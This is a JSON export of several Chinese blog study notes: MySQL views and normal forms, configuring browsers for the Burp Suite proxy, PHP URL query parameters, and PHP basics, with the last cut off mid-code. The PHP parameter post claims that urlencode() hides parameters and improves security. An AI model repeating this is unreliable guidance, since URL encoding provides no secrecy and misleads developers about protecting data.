| SAL     | COMM    | \n+-------+--------+-----------+------+------------+---------+---------+----\n|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     \n|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     \n|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     \n|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     \n|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     \n|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     \n|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 1000.00 |    NULL |     \n|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     \n|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 1000.00 |    NULL |     \n|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     \n|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     \n|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     \n|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     \n|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1000.00 |    NULL |     \n+-------+--------+-----------+------+------------+---------+---------+----\n\n12.2视图在开发中的作用\n假设有一条非常复杂的SQL语句，而这条SQL语句需要在不同的位置上反复使用。每一次使用这个sql语句的时候都需要重新编写，很长，很麻烦，怎么办？    可以把这条复杂的SQL语句以视图对象的形式新建。    在需要编写这条SQL语句的位置直接使用视图对象，可以大大简化开发。    并且利于后期的维护，因为修改的时候也只需要修改一个位置就行，只需要    修改视图对象所映射的SQL语句。\n\n我们以后面向视图开发的时候，使用视图的时候可以像使用table一样。\n\n可以对视图进行增删改查等操作。*视图不是在内存当中，视图对象也是存储在硬盘上的，不会消失。*\n\n\n13.数据库三范式第一范式：要求任何一张表必须有主键，每一个字段原子性不可再分。\n第二范式：建立在第一范式的基础之上，要求所有非主键字段完全依赖主键，不要产生部分依赖。\n第三范式：建立在第二范式的基础之上，要求所有非主键字段直接依赖主键，不要产生传递依赖。\n\n声明：三范式是面试官经常问的，所以一定要熟记在心！\n\n设计数据库表的时候，按照以上的范式进行，可以避免表中数据的冗余，空间的浪费。\n13.1第一范式学生编号 学生姓名 联系方式\n\t------------------------------------------\n\t1001\t\t张三\t\tzs@gmail.com,1359999999\n\t1002\t\t李四\t\tls@gmail.com,13699999999\n\t1001\t\t王五\t\tww@163.net,13488888888\n\t\n以上是学生表，满足第一范式吗？\n\t不满足，第一：没有主键。第二：联系方式可以分为邮箱地址和电话\n\n学生编号(pk) 学生姓名\t邮箱地址\t\t\t联系电话\n----------------------------------------------------\n1001\t\t\t\t张三\t\tzs@gmail.com\t1359999999\n1002\t\t\t\t李四\t\tls@gmail.com\t13699999999\n1003\t\t\t\t王五\t\tww@163.net\t\t13488888888\n\n13.2第二范式\t学生编号 \t\t学生姓名 \t教师编号 教师姓名\n\t----------------------------------------------------\n\t1001\t\t\t张三\t\t001\t\t王老师\n\t1002\t\t\t李四\t\t002\t\t赵老师\n\t1003\t\t\t王五\t\t001\t\t王老师\n\t1001\t\t\t张三\t\t002\t\t赵老师\n这张表描述了学生和老师的关系：（1个学生可能有多个老师，1个老师有多个学生）\n这是非常典型的：多对多关系！\n\n分析以上的表是否满足第一范式？\n\t不满足第一范式。\n\n怎么满足第一范式呢？修改\n\n学生编号+教师编号(pk)\t\t学生姓名  教师姓名\n----------------------------------------------------\n1001\t\t\t001\t\t\t\t张三\t\t\t王老师\n1002\t\t\t002\t\t\t\t李四\t\t\t赵老师\n1003\t\t\t001\t\t\t\t王五\t\t\t王老师\n1001\t\t\t002\t\t\t\t张三\t\t\t赵老师\n\n学生编号 教师编号，两个字段联合做主键，复合主键（PK: 学生编号+教师编号）\n经过修改之后，以上的表满足了第一范式。但是满足第二范式吗？\n\t不满足，“张三”依赖1001，“王老师”依赖001，显然产生了部分依赖。\n\t产生部分依赖有什么缺点？\n\t\t数据冗余了。空间浪费了。“张三”重复了，“王老师”重复了。\n\n为了让以上的表满足第二范式，你需要这样设计：\n\t使用三张表来表示多对多的关系！！！！\n\t学生表\n\t学生编号(pk)\t\t学生名字\n\t------------------------------------\n\t1001\t\t\t\t\t张三\n\t1002\t\t\t\t\t李四\n\t1003\t\t\t\t\t王五\n\t\n\t教师表\n\t教师编号(pk)\t\t教师姓名\n\t--------------------------------------\n\t001\t\t\t\t\t王老师\n\t002\t\t\t\t\t赵老师\n\n\t学生教师关系表\n\tid(pk)\t\t\t学生编号(fk)\t\t\t教师编号(fk)\n\t------------------------------------------------------\n\t1\t\t\t\t\t\t1001\t\t\t\t\t\t001\n\t2\t\t\t\t\t\t1002\t\t\t\t\t\t002\n\t3\t\t\t\t\t\t1003\t\t\t\t\t\t001\n\t4\t\t\t\t\t\t1001\t\t\t\t\t\t002\n\n\n多对多，三张表，关系表两个外键！！！！！！！！！！！！！！！\n\n13.3第三范式​\t\n\t学生编号（PK） \t\t\t学生姓名  班级编号  \t班级名称\n---------------------------------------------------------\n\n​\t\t1001\t\t\t\t张三\t\t01\t\t\t一年一班\n​\t\t1002\t\t\t\t李四\t\t02\t\t\t一年二班\n​\t\t1003\t\t\t\t王五\t\t03\t\t\t一年三班\n​\t\t1004\t\t\t\t赵六\t\t03\t\t\t一年三班\n\n以上表的设计是描述：班级和学生的关系。很显然是1对多关系！\n一个教室中有多个学生。\n\n分析以上表是否满足第一范式？\n\t满足第一范式，有主键。\n\n分析以上表是否满足第二范式？\n\t满足第二范式，因为主键不是复合主键，没有产生部分依赖。主键是单一主键。\n\n分析以上表是否满足第三范式？\n\t第三范式要求：不要产生传递依赖！\n\t一年一班依赖01，01依赖1001，产生了传递依赖。\n\t不符合第三范式的要求。产生了数据的冗余。\n\n那么应该怎么设计一对多呢？\n\n\t班级表：一\n\t班级编号(pk)\t\t\t\t班级名称\n\t----------------------------------------\n\t01\t\t\t\t\t\t\t\t一年一班\n\t02\t\t\t\t\t\t\t\t一年二班\n\t03\t\t\t\t\t\t\t\t一年三班\n\n\t学生表：多\n\n\t学生编号（PK） 学生姓名 班级编号(fk)\n\t-------------------------------------------\n\t1001\t\t\t\t张三\t\t\t01\t\t\t\n\t1002\t\t\t\t李四\t\t\t02\t\t\t\n\t1003\t\t\t\t王五\t\t\t03\t\t\t\n\t1004\t\t\t\t赵六\t\t\t03\t\t\n\n\n一对多，两张表，多的表加外键！！！！！！！！！！！！\n\n关于三范式的实际使用\n数据库设计三范式是理论上的，实践和理论有的时候有偏差。\n最终的目的都是为了满足客户的需求，有的时候会拿冗余换执行速度。\n因为在sql当中，表和表之间连接次数越多，效率越低。（笛卡尔积）\n有的时候可能会存在冗余，但是为了减少表的连接次数，这样做也是合理的，并且对于开发人员来说，sql语句的编写难度也会降低。\n面试的时候把这句话说上：他就不会认为你是初级程序员了！\n\n\n\n\n\n\n\n\n\n在线笔记都是引用别人的笔记，保存下来方便自己学习，如有侵权请联系我删除\n原文：https://gitee.com/yueliu2345/mysql\n","slug":"MYSQL","date":"2022-11-15T11:59:13.443Z","categories_index":"在线笔记","tags_index":"mysql","author_index":"Abyssaler"},{"id":"d689efbf93d434acdbec39ba18988ad9","title":"如何为浏览器配置Burp Suite代理","content":"如何为各浏览器配置Burp Suite代理首先需要确定你的burp suite是否配置好了代理\n如图，这里我是配置好了\nGoogle配置安装Proxy SwitchyOmega插件\n\n插件配置新建一个burp suite模式\n\n配置参数，注意这里要与你burp suite配置中的一致\n\n保存\n\n以后你想用chrome抓包就直接在这里选了\n\n可能遇到的问题首次抓取HTTPS时，浏览器会报安全问题\n\n解决办法\n\n在此页面访问http://burp\n\n\n\n点右上角下载ca证书\n\n\n在chrome中导入证书\n\n\n\n找到之前下载的证书的位置（如果找不到，打开所有文件选项）\n\n然后一直下一步导入就成功了\n\n\n其他浏览器配置思路大致相同","slug":"如何为各浏览器配置Burp Suite代理","date":"2022-11-15T07:43:18.390Z","categories_index":"环境配置","tags_index":"工具","author_index":"Abyssaler"},{"id":"7ed8089baf30886b0aa7735f2db515b2","title":"php怎么通过url传参","content":"php怎么通过url传参​\t目前正在学php基础,遇到一个困扰我的问题,那就是通过使用_GET[]的方式获取url中所传的参数中?的用途,如下图:\n\n123.php页面代码如图\n\n为什么通过在127.0.0.1&#x2F;php.123后面输入?target&#x3D;import.php后var_dump函数会把target当成关联数组里面的key从而取出target被赋予的值呢?这其中?起了什么作用\n通过了解得知,?表示传参,拿127.0.0.1&#x2F;php.123?target&#x3D;import.php举例子,?表示对当前php.123页面进行传参,传参的内容为名为target,值为import.php的这样一个参数.这引起了我的好奇,因为?在php语法中是一个三元运算符\n错误思路:三元运算符?作为三元运算符的的语法格式是:(expr1) ? (expr2) : (expr3),对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3.\n当我顺着这个思路再看url&#x2F;?target&#x3D;import.php这串代码时,怎么看怎么抽象,于是乎,继续查\n正解:url&#x2F;?x&#x3D;是php中的一项基本技巧通过检索网上其他的文章,得知使用url传递参数是php中的一项基本技巧，一般格式为url&#x2F;?x&#x3D;,这其中?是一种url固定的格式 ，在url格式中表示传参，这里不应该用php的语法去理解它。\n举例，如果要通过url传递一个参数n&#x3D;5，那么url应当为url&#x2F;?n&#x3D;5，php页面中应当包含如下代码：\n$n &#x3D; $_GET[‘n’];\n\n这就是一种固定的格式,纯粹是自己想多了…\n不过既然都查到这里来了,就顺便再深入一下\n显而易见，这种方法将会把参数暴露出来，安全系数较低。因此，可以有一种 URL 的编码方式，对 URL 传递的参数进行编码。以此让参数不可见\nurlencode(string)urlencode()函数实现将字符串 string 进行 URL 编码。应用urlencode()函数对 URL 传递的参数值进行编码，显示的字符串是URL 编码后的字符串，其实现的代码如下所示：\n&lt;?php\n$url &#x3D; urlencode(&quot;你想传入的参数&quot;);&#x2F;&#x2F;对参数编码\necho&quot;123.php?id&#x3D;&quot;.$url;\n?&gt;\n\n在浏览器中输入运行地址，按回车键，得到如下所示的运行结果：\nindex.php?id&#x3D;PHP%E4%B8%AD%E6%96%87%E7%BD%91\n\n这同时说明了对于服务器而言，编码前后的字符串并没有什么区别，服务器能够自动识别.\n","slug":"php怎么通过url传参","date":"2022-11-13T15:58:26.107Z","categories_index":"踩坑记录","tags_index":"php","author_index":"Abyssaler"},{"id":"e2beb8c86086697d45d0d68d245fa991","title":"PHP基础","content":"PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言\nPHP 是什么？\nPHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。\nPHP 脚本在服务器上执行。\nPHP 可免费下载使用。\n\nPHP 文件是什么？\nPHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码\nPHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器\nPHP 文件的默认文件扩展名是 “.php”\n\nPHP 能做什么？\nPHP 可以生成动态页面内容\nPHP 可以创建、打开、读取、写入、关闭服务器上的文件\nPHP 可以收集表单数据\nPHP 可以发送和接收 cookies\nPHP 可以添加、删除、修改您的数据库中的数据\nPHP 可以限制用户访问您的网站上的一些页面\nPHP 可以加密数据\n\n为什么使用 PHP？\nPHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）\nPHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）\nPHP 提供了广泛的数据库支持\nPHP 易于学习，并可高效地运行在服务器端\n\nPHP语法PHP 脚本可以放在文档中的任何位置。\nPHP 脚本以  结束：\nPHP 文件的默认文件扩展名是 “.php”。\nPHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;h1&gt;My first PHP page&lt;&#x2F;h1&gt;\n\n&lt;?php\necho &quot;Hello World!&quot;;\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nPHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。\n通过 PHP，有两种在浏览器输出文本的基础指令：echo 和 print。\nPHP 注释\n&#x2F;&#x2F;      单行注释\n&#x2F;*  *&#x2F;   多行注释\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n&#x2F;&#x2F; 这是 PHP 单行注释\n\n&#x2F;*\n这是\nPHP 多行\n注释\n*&#x2F;\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n变量变量是用于存储信息的”容器”\n&lt;?php\n$x&#x3D;5;\n$y&#x3D;6;\n$z&#x3D;$x+$y;\necho $z;\n?&gt;\n\n\n\nPHP 变量规则\n\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n\n创建PHP变量PHP 没有声明变量的命令。\n变量在您第一次赋值给它的时候被创建\n&lt;?php\n$txt&#x3D;&quot;Hello world!&quot;;\n$x&#x3D;5;\n$y&#x3D;10.5;\n?&gt;\n\n在上面的语句执行中，变量 txt 将保存值 **Hello world!**，且变量 x 将保存值 5。\n注释：当您赋一个文本值给变量时，请在文本值两侧加上引号。\nPHP 是一门弱类型语言PHP 会根据变量的值，自动把变量转换为正确的数据类型。\n在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。\necho 和 print 语句echo 和 print 区别:\n\necho - 可以输出一个或多个字符串\nprint - 只允许输出一个字符串，返回值总为 1\n\n提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。\necho 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。\n显示字符串\n&lt;?php\necho &quot;&lt;h2&gt;PHP 很有趣!&lt;&#x2F;h2&gt;&quot;;\necho &quot;Hello world!&lt;br&gt;&quot;;\necho &quot;我要学 PHP!&lt;br&gt;&quot;;\necho &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;\n?&gt;\n\n\n\n显示变量\n&lt;?php\n$txt1&#x3D;&quot;学习 PHP&quot;;\n$txt2&#x3D;&quot;xbxaq.com&quot;;\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n \necho $txt1;\necho &quot;&lt;br&gt;&quot;;\necho &quot;在 $txt2 学习 PHP &quot;;\necho &quot;&lt;br&gt;&quot;;\necho &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;\n?&gt;\n\n\n\nprint 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。\n显示字符串\n&lt;?php\nprint &quot;&lt;h2&gt;PHP 很有趣!&lt;&#x2F;h2&gt;&quot;;\nprint &quot;Hello world!&lt;br&gt;&quot;;\nprint &quot;我要学习 PHP!&quot;;\n?&gt;\n\n\n\n显示变量\n&lt;?php\n$txt1&#x3D;&quot;学习 PHP&quot;;\n$txt2&#x3D;&quot;xbxaq.COM&quot;;\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n \nprint $txt1;\nprint &quot;&lt;br&gt;&quot;;\nprint &quot;在 $txt2 学习 PHP &quot;;\nprint &quot;&lt;br&gt;&quot;;\nprint &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;\n?&gt;\n\n\n\n数据类型PHP 变量存储不同的类型的数据，不同的数据类型可以做不一样的事情。\nPHP 支持以下几种数据类型:\n\nString（字符串）\nInteger（整型）\nFloat（浮点型）\nBoolean（布尔型）\nArray（数组）\nObject（对象）\nNULL（空值）\nResource（资源类型）\n\n字符串一个字符串是一串字符的序列，就像 “Hello world!”。\n你可以将任何文本放在单引号和双引号中\n&lt;?php \n$x &#x3D; &quot;Hello world!&quot;;\necho $x;\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; &#39;Hello world!&#39;;\necho $x;\n?&gt;\n\n\n\n整型整数是一个没有小数的数字。\n整数规则:\n\n整数必须至少有一个数字 (0-9)\n整数不能包含逗号或空格\n整数是没有小数点的\n整数可以是正数或负数\n整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。\n\nPHP var_dump() 函数返回变量的数据类型和值\n&lt;?php \n$x &#x3D; 5985;\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; -345; &#x2F;&#x2F; 负数 \nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; 0x8C; &#x2F;&#x2F; 十六进制数\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;;\n$x &#x3D; 047; &#x2F;&#x2F; 八进制数\nvar_dump($x);\n?&gt;\n\n\n\n浮点型浮点数是带小数部分的数字，或是指数形式\n&lt;?php \n$x &#x3D; 10.365;\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; 2.4e3;\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; 8E-5;\nvar_dump($x);\n?&gt;\n\n\n\n布尔型布尔型可以是 TRUE 或 FALSE\n布尔型通常用于条件判断\n数组数组可以在一个变量中存储多个值\n&lt;?php \n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\nvar_dump($cars);\n?&gt;\n\n\n\n对象对象数据类型也可以用于存储数据。\n在 PHP 中，对象必须声明。\n首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。\n然后我们在类中定义数据类型，然后在实例化的类中使用数据类型\n&lt;?php\nclass Car\n&#123;\n  var $color;\n  function __construct($color&#x3D;&quot;green&quot;) &#123;\n    $this-&gt;color &#x3D; $color;\n  &#125;\n  function what_color() &#123;\n    return $this-&gt;color;\n  &#125;\n&#125;\n?&gt;\n\n\n\nNULL 值NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。\nNULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。\n可以通过设置变量值为 NULL 来清空变量数据\n&lt;?php\n$x&#x3D;&quot;Hello world!&quot;;\n$x&#x3D;null;\nvar_dump($x);\n?&gt;\n\n\n\n类型比较虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。\n\n松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。\n严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。\n\n例如，”42” 是一个字符串而 42 是一个整数。FALSE 是一个布尔值而 “FALSE” 是一个字符串。\n&lt;?php\nif(42 &#x3D;&#x3D; &quot;42&quot;) &#123;\n    echo &#39;1、值相等&#39;;\n&#125;\n \necho PHP_EOL; &#x2F;&#x2F; 换行符\n \nif(42 &#x3D;&#x3D;&#x3D; &quot;42&quot;) &#123;\n    echo &#39;2、类型相等&#39;;\n&#125; else &#123;\n    echo &#39;3、类型不相等&#39;;\n&#125;\n?&gt;\n\n\n\nPHP中 比较 0、false、null&lt;?php\necho &#39;0 &#x3D;&#x3D; false: &#39;;\nvar_dump(0 &#x3D;&#x3D; false);\necho &#39;0 &#x3D;&#x3D;&#x3D; false: &#39;;\nvar_dump(0 &#x3D;&#x3D;&#x3D; false);\necho PHP_EOL;\necho &#39;0 &#x3D;&#x3D; null: &#39;;\nvar_dump(0 &#x3D;&#x3D; null);\necho &#39;0 &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(0 &#x3D;&#x3D;&#x3D; null);\necho PHP_EOL;\necho &#39;false &#x3D;&#x3D; null: &#39;;\nvar_dump(false &#x3D;&#x3D; null);\necho &#39;false &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(false &#x3D;&#x3D;&#x3D; null);\necho PHP_EOL;\necho &#39;&quot;0&quot; &#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D; false);\necho &#39;&quot;0&quot; &#x3D;&#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D;&#x3D; false);\necho PHP_EOL;\necho &#39;&quot;0&quot; &#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D; null);\necho &#39;&quot;0&quot; &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D;&#x3D; null);\necho PHP_EOL;\necho &#39;&quot;&quot; &#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D; false);\necho &#39;&quot;&quot; &#x3D;&#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D;&#x3D; false);\necho PHP_EOL;\necho &#39;&quot;&quot; &#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D; null);\necho &#39;&quot;&quot; &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D;&#x3D; null);\n\n\n\n常量常量值被定义后，在脚本的其他任何地方都不能被改变\n常量是一个简单值的标识符。该值在脚本中不能改变。\n一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。\n注意： 常量在整个脚本中都可以使用。\n设置常量，使用 define() 函数，函数语法如下\nbool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] )\n\n该函数有三个参数:\n\nname：必选参数，常量名称，即标志符。\nvalue：必选参数，常量的值。\ncase_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。\n\n创建一个 区分大小写的常量, 常量值为 “欢迎访问 xbxaq.com”\n&lt;?php\n&#x2F;&#x2F; 区分大小写的常量名\ndefine(&quot;GREETING&quot;, &quot;欢迎访问 xbxaq.com&quot;);\necho GREETING;    &#x2F;&#x2F; 输出 \necho &#39;&lt;br&gt;&#39;;\necho greeting;   &#x2F;&#x2F; 输出 &quot;greeting&quot;，但是有警告信息，表示该常量未定义\n?&gt;\n\n\n\n运算符 PHP 中，赋值运算符 &#x3D; 用于给变量赋值。\n在 PHP 中，算术运算符 + 用于把值加在一起。\n算术运算符&lt;?php \n$x&#x3D;10; \n$y&#x3D;6;\necho ($x + $y); &#x2F;&#x2F; 输出16\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x - $y); &#x2F;&#x2F; 输出4\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x * $y); &#x2F;&#x2F; 输出60\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x &#x2F; $y); &#x2F;&#x2F; 输出1.6666666666667\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x % $y); &#x2F;&#x2F; 输出4\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho -$x;\n?&gt;\n\n\n\n赋值运算符&lt;?php \n$x&#x3D;10; \necho $x; &#x2F;&#x2F; 输出10\n \n$y&#x3D;20; \n$y +&#x3D; 100;\necho $y; &#x2F;&#x2F; 输出120\n \n$z&#x3D;50;\n$z -&#x3D; 25;\necho $z; &#x2F;&#x2F; 输出25\n \n$i&#x3D;5;\n$i *&#x3D; 6;\necho $i; &#x2F;&#x2F; 输出30\n \n$j&#x3D;10;\n$j &#x2F;&#x3D; 5;\necho $j; &#x2F;&#x2F; 输出2\n \n$k&#x3D;15;\n$k %&#x3D; 4;\necho $k; &#x2F;&#x2F; 输出3\n?&gt;\n\n\n\n递增&#x2F;递减运算符&lt;?php\n$x&#x3D;10; \necho ++$x; &#x2F;&#x2F; 输出11\n \n$y&#x3D;10; \necho $y++; &#x2F;&#x2F; 输出10\n \n$z&#x3D;5;\necho --$z; &#x2F;&#x2F; 输出4\n \n$i&#x3D;5;\necho $i--; &#x2F;&#x2F; 输出5\n?&gt;\n\n\n\n比较运算符&lt;?php\n$x&#x3D;100; \n$y&#x3D;&quot;100&quot;;\n \nvar_dump($x &#x3D;&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($x &#x3D;&#x3D;&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($x !&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($x !&#x3D;&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\n \n$a&#x3D;50;\n$b&#x3D;90;\n \nvar_dump($a &gt; $b);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($a &lt; $b);\n?&gt;\n\n\n\n三元运算符语法格式(expr1) ? (expr2) : (expr3) \n\n对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。\n条件语句您编写代码时，您常常需要为不同的判断执行不同的动作。您可以在代码中使用条件语句来完成此任务。\n在 PHP 中，提供了下列条件语句：\n\nif 语句 - 在条件成立时执行代码\nif…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码\nif…elseif….else 语句 - 在若干条件之一成立时执行一个代码块\nswitch 语句 - 在若干条件之一成立时执行一个代码块\n\nif 语句用于仅当指定条件成立时执行代码\n语法if (条件)\n&#123;\n    条件成立时要执行的代码;\n&#125;\n\n&lt;?php\n$t&#x3D;date(&quot;H&quot;);\nif ($t&lt;&quot;20&quot;)\n&#123;\n    echo &quot;Have a good day!&quot;;\n&#125;\n?&gt;\n\n\n\nif…else 语句在条件成立时执行一块代码，条件不成立时执行另一块代码，请使用 if….else 语句。\n语法if (条件)\n&#123;\n条件成立时执行的代码;\n&#125;\nelse\n&#123;\n条件不成立时执行的代码;\n&#125;\n\n\n\n&lt;?php\n$t&#x3D;date(&quot;H&quot;);\nif ($t&lt;&quot;20&quot;)\n&#123;\n    echo &quot;Have a good day!&quot;;\n&#125;\nelse\n&#123;\n    echo &quot;Have a good night!&quot;;\n&#125;\n?&gt;\n\n\n\nif…elseif….else 语句在若干条件之一成立时执行一个代码块，请使用 if….elseif…else 语句。.\n语法if (条件)\n&#123;\n    if 条件成立时执行的代码;\n&#125;\nelseif (条件)\n&#123;\n    elseif 条件成立时执行的代码;\n&#125;\nelse\n&#123;\n    条件不成立时执行的代码;\n&#125;\n\n\n\n&lt;?php\n$t&#x3D;date(&quot;H&quot;);\nif ($t&lt;&quot;10&quot;)\n&#123;\n    echo &quot;Have a good morning!&quot;;\n&#125;\nelseif ($t&lt;&quot;20&quot;)\n&#123;\n    echo &quot;Have a good day!&quot;;\n&#125;\nelse\n&#123;\n    echo &quot;Have a good night!&quot;;\n&#125;\n?&gt;\n\n\n\nSwitch 语句switch 语句用于根据多个不同条件执行不同动作。\n如果您希望有选择地执行若干代码块之一，请使用 switch 语句。\n&lt;?php\n$favcolor&#x3D;&quot;red&quot;;\nswitch ($favcolor)\n&#123;\ncase &quot;red&quot;:\n    echo &quot;你喜欢的颜色是红色!&quot;;\n    break;\ncase &quot;blue&quot;:\n    echo &quot;你喜欢的颜色是蓝色!&quot;;\n    break;\ncase &quot;green&quot;:\n    echo &quot;你喜欢的颜色是绿色!&quot;;\n    break;\ndefault:\n    echo &quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;;\n&#125;\n?&gt;\n\n\n\n数组数组能够在单个变量中存储多个值\n数组可以在单个变量中存储多个值，并且您可以根据键访问其中的值。\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\necho &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;\n?&gt;\n\n\n\n创建数组在 PHP 中，array() 函数用于创建数组：\narray();\n\n\n\n在 PHP 中，有三种类型的数组：\n\n数值数组 - 带有数字 ID 键的数组\n关联数组 - 带有指定的键的数组，每个键关联一个值\n多维数组 - 包含一个或多个数组的数组\n\n数值数组这里有两种创建数值数组的方法：\n自动分配 ID 键（ID 键总是从 0 开始）：\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\necho &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;\n?&gt;\n\n\n\n获取数组的长度 - count() 函数count() 函数用于返回数组的长度（元素的数量）\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\necho count($cars);\n?&gt;\n\n\n\n遍历数值数组遍历并打印数值数组中的所有值，您可以使用 for 循环\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n$arrlength&#x3D;count($cars);\n \nfor($x&#x3D;0;$x&lt;$arrlength;$x++)\n&#123;\n    echo $cars[$x];\n    echo 